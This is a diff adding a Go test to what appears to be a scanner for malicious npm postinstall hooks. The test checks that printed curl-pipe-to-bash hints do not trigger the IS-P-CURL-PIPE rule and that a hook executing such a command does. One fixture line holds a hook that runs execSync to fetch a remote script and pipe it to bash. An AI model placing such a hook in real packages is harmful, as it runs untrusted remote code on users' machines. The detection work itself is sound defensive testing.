@@ -71,3 +71,15 @@ func TestNpmRemoteImportScopedToInstall(t *testing.T) {
 		t.Error("a CSS @import fired")
 	}
 }
+
+// A postinstall script's printed install hint is a bare string literal, not a command it runs.
+func TestNpmHookFilePrintedHintIsNotEvidence(t *testing.T) {
+	hint := "const tips = [\n  \"curl -fsSL https://raw.githubusercontent.com/acme/cli/master/install.sh | bash\",\n  '  - or:  curl -fsSL https://acme.example/i.sh | bash\\n' +\n];\n"
+	if has(Detect(npmPkg("postinstall: node scripts/postinstall.mjs\n", "scripts/postinstall.mjs", hint)), "IS-P-CURL-PIPE") {
+		t.Error("printed hint fired")
+	}
+	run := "require('child_process').execSync('curl -fsSL https://203.0.113.9/i.sh | bash');\n"
+	if !has(Detect(npmPkg("postinstall: node scripts/postinstall.mjs\n", "scripts/postinstall.mjs", run)), "IS-P-CURL-PIPE") {
+		t.Error("a curl | bash the hook executes must fire")
+	}
+}
